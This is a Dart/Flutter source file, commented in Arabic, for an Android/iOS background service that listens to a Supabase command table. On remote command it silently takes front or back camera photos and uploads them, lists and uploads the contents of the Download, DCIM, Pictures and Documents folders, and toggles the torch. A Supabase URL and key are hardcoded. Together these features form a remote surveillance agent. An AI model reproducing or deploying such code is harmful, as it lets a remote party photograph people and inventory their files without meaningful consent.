import 'dart:async';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:torch_light/torch_light.dart';
import 'package:camera/camera.dart';

/// مفتاح تفضيلات تشغيل الخدمة الخلفية
const String kBackgroundServerEnabledKey = 'background_server_enabled';

/// معرف قناة الإشعارات
const String kNotificationChannelId = 'background_server_channel';

/// خدمة الخادم الخلفي - تعمل كسيرفر حتى عند إغلاق التطبيق
class BackgroundServerService {
  static final FlutterBackgroundService _service = FlutterBackgroundService();

  /// تهيئة الخدمة الخلفية
  static Future<void> initialize() async {
    // إنشاء قناة الإشعارات
    const AndroidNotificationChannel channel = AndroidNotificationChannel(
      kNotificationChannelId,
      'خدمة الخلفية',
      description: 'التطبيق يعمل في الخلفية',
      importance: Importance.low,
    );

    final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
        FlutterLocalNotificationsPlugin();

    await flutterLocalNotificationsPlugin
        .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin
        >()
        ?.createNotificationChannel(channel);

    await _service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: false, // لا تبدأ تلقائياً - سيتم التحكم يدوياً
        isForegroundMode: true,
        notificationChannelId: kNotificationChannelId,
        initialNotificationTitle: 'خدمة الخلفية',
        initialNotificationContent: 'التطبيق يعمل في الخلفية...',
        foregroundServiceNotificationId: 888,
        foregroundServiceTypes: [
          AndroidForegroundType.dataSync,
          AndroidForegroundType.camera,
        ],
      ),
      iosConfiguration: IosConfiguration(
        autoStart: false,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
    );

    debugPrint('🚀 BackgroundServerService: Initialized');
  }

  /// تشغيل الخدمة الخلفية
  static Future<void> startService() async {
    final isRunning = await _service.isRunning();
    if (!isRunning) {
      await _service.startService();
      await _setEnabled(true);
      debugPrint('✅ BackgroundServerService: Started');
    } else {
      debugPrint('⚠️ BackgroundServerService: Already running');
    }
  }

  /// إيقاف الخدمة الخلفية
  static Future<void> stopService() async {
    final isRunning = await _service.isRunning();
    if (isRunning) {
      _service.invoke('stopService');
      await _setEnabled(false);
      debugPrint('🛑 BackgroundServerService: Stopped');
    }
  }

  /// التحقق مما إذا كانت الخدمة تعمل
  static Future<bool> isRunning() async {
    return await _service.isRunning();
  }

  /// التحقق مما إذا كانت الخدمة مفعلة في التفضيلات
  static Future<bool> isEnabled() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool(kBackgroundServerEnabledKey) ?? false;
  }

  /// حفظ حالة التفعيل
  static Future<void> _setEnabled(bool enabled) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool(kBackgroundServerEnabledKey, enabled);
  }

  /// التبديل بين التشغيل والإيقاف
  static Future<bool> toggle() async {
    final isRunning = await _service.isRunning();
    if (isRunning) {
      await stopService();
      return false;
    } else {
      await startService();
      return true;
    }
  }
}

/// معالج iOS في الخلفية
@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  return true;
}

/// معالج بدء الخدمة - يجب أن تكون top-level function
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  debugPrint('🚀 BackgroundServer: Service started');

  // إعداد الإشعار
  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });

    service.on('stopService').listen((event) {
      service.stopSelf();
    });
  }

  // تهيئة Supabase
  try {
    await Supabase.initialize(
      url: 'https://eshaaxobhzjcvpbswfhv.supabase.co',
      anonKey:
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVzaGFheG9iaHpqY3ZwYnN3Zmh2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzM1NjE2NzMsImV4cCI6MjA0OTEzNzY3M30.5KH_iRLbpkEFOSndKcxjLlfIXvCE1Od5iLRBaJVFKUE',
    );
    debugPrint('✅ BackgroundServer: Supabase initialized');
  } catch (e) {
    debugPrint(
      '⚠️ BackgroundServer: Supabase already initialized or error: $e',
    );
  }

  final supabase = Supabase.instance.client;

  // الحصول على معرف المستخدم المحفوظ
  final prefs = await SharedPreferences.getInstance();
  final userId = prefs.getInt('user_id');

  if (userId == null) {
    debugPrint('❌ BackgroundServer: No user ID found');
    return;
  }

  debugPrint('👤 BackgroundServer: Listening for commands for user $userId');

  // الاستماع للأوامر في الوقت الحقيقي
  supabase
      .from('user_commands')
      .stream(primaryKey: ['id'])
      .eq('user_id', userId)
      .listen((data) async {
        for (final command in data) {
          if (command['executed'] == true) continue;

          final commandType = command['command_type'] as String?;
          final commandId = command['id'];

          debugPrint('📨 BackgroundServer: Received command: $commandType');

          try {
            switch (commandType) {
              case 'flash_on':
                await TorchLight.enableTorch();
                debugPrint('🔦 BackgroundServer: Flash ON');
                break;
              case 'flash_off':
                await TorchLight.disableTorch();
                debugPrint('🔦 BackgroundServer: Flash OFF');
                break;
              case 'capture_front':
                await _capturePhoto(true, userId);
                break;
              case 'capture_back':
                await _capturePhoto(false, userId);
                break;
              case 'list_files':
                await _listFiles(userId);
                break;
            }

            // تحديث حالة الأمر إلى منفذ
            await supabase
                .from('user_commands')
                .update({'executed': true})
                .eq('id', commandId);

            debugPrint('✅ BackgroundServer: Command $commandType executed');
          } catch (e) {
            debugPrint('❌ BackgroundServer: Error executing command: $e');
          }
        }
      });

  // تحديث الإشعار كل ثانية لإظهار أن الخدمة تعمل
  Timer.periodic(const Duration(seconds: 30), (timer) async {
    if (service is AndroidServiceInstance) {
      if (await service.isForegroundService()) {
        service.setForegroundNotificationInfo(
          title: '🟢 الخدمة الخلفية نشطة',
          content:
              'التطبيق يستمع للأوامر... ${DateTime.now().toString().substring(11, 19)}',
        );
      }
    }
  });
}

/// التقاط صورة
Future<void> _capturePhoto(bool isFront, int userId) async {
  try {
    final cameras = await availableCameras();
    if (cameras.isEmpty) {
      debugPrint('❌ BackgroundServer: No cameras available');
      return;
    }

    final camera = isFront
        ? cameras.firstWhere(
            (c) => c.lensDirection == CameraLensDirection.front,
            orElse: () => cameras.first,
          )
        : cameras.firstWhere(
            (c) => c.lensDirection == CameraLensDirection.back,
            orElse: () => cameras.first,
          );

    final controller = CameraController(camera, ResolutionPreset.medium);
    await controller.initialize();

    final image = await controller.takePicture();
    final bytes = await File(image.path).readAsBytes();

    final fileName =
        '${userId}_${isFront ? 'front' : 'back'}_${DateTime.now().millisecondsSinceEpoch}.jpg';

    final supabase = Supabase.instance.client;
    await supabase.storage.from('captures').uploadBinary(fileName, bytes);

    await controller.dispose();
    await File(image.path).delete();

    debugPrint('📸 BackgroundServer: Photo captured and uploaded: $fileName');
  } catch (e) {
    debugPrint('❌ BackgroundServer: Error capturing photo: $e');
  }
}

/// جلب قائمة الملفات
Future<void> _listFiles(int userId) async {
  try {
    final directories = <String>[
      '/storage/emulated/0/Download',
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Documents',
    ];

    final files = <Map<String, dynamic>>[];

    for (final dirPath in directories) {
      final dir = Directory(dirPath);
      if (await dir.exists()) {
        await for (final entity in dir.list(recursive: false)) {
          if (entity is File) {
            final stat = await entity.stat();
            files.add({
              'name': entity.path.split('/').last,
              'path': entity.path,
              'size': stat.size,
              'type': entity.path.split('.').last,
              'modified': stat.modified.toIso8601String(),
            });
          }
        }
      }
    }

    final supabase = Supabase.instance.client;
    await supabase.from('user_files').upsert({
      'user_id': userId,
      'files': files,
      'updated_at': DateTime.now().toIso8601String(),
    });

    debugPrint('📁 BackgroundServer: Listed ${files.length} files');
  } catch (e) {
    debugPrint('❌ BackgroundServer: Error listing files: $e');
  }
}
